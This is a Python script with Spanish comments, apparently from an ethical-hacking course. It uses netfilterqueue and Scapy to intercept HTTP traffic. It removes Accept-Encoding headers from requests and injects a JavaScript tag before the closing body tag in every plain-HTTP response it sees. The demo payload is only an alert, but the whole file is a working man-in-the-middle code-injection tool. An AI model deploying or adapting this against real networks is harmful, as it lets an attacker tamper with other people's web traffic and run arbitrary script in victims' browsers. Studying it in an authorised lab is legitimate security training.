#!/usr/bin/env python3

# Importa las librerías necesarias para trabajar con colas de filtrado de paquetes y para manipularlos.
import netfilterqueue
import scapy.all as scapy
import re  # Librería de expresiones regulares para buscar y reemplazar en los datos.

# Define una función para ajustar el contenido (payload) del paquete.
def set_load(packet, load):
    packet[scapy.Raw].load = load  # Establece el nuevo contenido.

    # Elimina los campos de longitud y checksum para que Scapy los recalculé automáticamente,
    # debido a que el contenido del paquete ha sido modificado.
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet  # Devuelve el paquete modificado.

# Función que procesará cada paquete capturado.
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # Convierte el paquete a un formato que Scapy puede manipular.

    # Verifica si el paquete contiene datos (Raw) que se pueden modificar.
    if scapy_packet.haslayer(scapy.Raw):
        try:
            # Si el paquete es una solicitud HTTP (dport 80), modifica los encabezados de aceptación de codificación.
            if scapy_packet[scapy.TCP].dport == 80:
                print(f"\n[+] Solicitud:\n")
                # Elimina el encabezado de codificación de aceptación para evitar compresiones que Scapy no puede manejar.
                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(bytes(new_packet))
                
            # Si el paquete es una respuesta HTTP (sport 80), inyecta código JavaScript.
            elif scapy_packet[scapy.TCP].sport == 80:
                # Inyecta un script JavaScript justo antes del cierre del tag </body>.
                modified_load = scapy_packet[scapy.Raw].load.replace(b'</body>', b'<script>alert("Se tensa con el XSS");</script></body>')
                new_packet = set_load(scapy_packet, modified_load)
                packet.set_payload(bytes(new_packet))

        except:
            pass

    packet.accept()  # Acepta el paquete modificado para que continúe su camino.

# Crea y configura la cola de NetfilterQueue.
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # Vincula la cola con la función de procesamiento de paquetes.
queue.run()  # Inicia el bucle de procesamiento de paquetes.
